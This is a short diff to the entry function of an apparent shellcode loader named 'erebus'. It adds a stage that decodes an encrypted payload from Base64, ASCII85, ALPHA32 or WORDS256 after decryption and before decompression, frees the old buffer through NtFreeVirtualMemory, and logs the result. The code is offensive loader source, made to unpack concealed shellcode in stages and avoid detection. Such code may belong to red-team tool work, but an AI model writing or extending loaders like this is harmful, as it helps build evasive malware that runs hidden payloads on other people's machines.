@@ -235,6 +235,31 @@ VOID entry(void)
 	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key_copy, sizeof(key_copy), iv, iv_len);
 	SecureZeroMemory(key_copy, sizeof(key_copy));
 
+	// Decode stage (Base64 / ASCII85 / ALPHA32 / WORDS256).
+	// shellcrypt pipeline: compress → encode → encrypt.
+	// Reverse:             decrypt  → decode  → decompress.
+	// DecodeShellcode is defined by config.hpp based on CONFIG_ENCODING_TYPE;
+	// when type == 0 the macro is undefined so this block compiles away.
+#ifdef DecodeShellcode
+	{
+		BYTE*  _dec_out = nullptr;
+		SIZE_T _dec_len = 0;
+		if (DecodeShellcode((CHAR*)shellcode_ptr, shellcode_size, &_dec_out, &_dec_len) && _dec_out && _dec_len)
+		{
+			PVOID _fb = shellcode_ptr; SIZE_T _fs = 0;
+			if (NtFreeVirtualMemory) NtFreeVirtualMemory(NtCurrentProcess(), &_fb, &_fs, MEM_RELEASE);
+			shellcode_ptr  = _dec_out;
+			shellcode_size = _dec_len;
+			LOG_SUCCESS("Decoded shellcode: %zu bytes", shellcode_size);
+		}
+		else
+		{
+			LOG_ERROR("Shellcode decode step failed");
+			if (_dec_out) free(_dec_out);
+		}
+	}
+#endif
+
 	erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
 
 	if (shellcode_ptr == NULL || shellcode_size == 0)
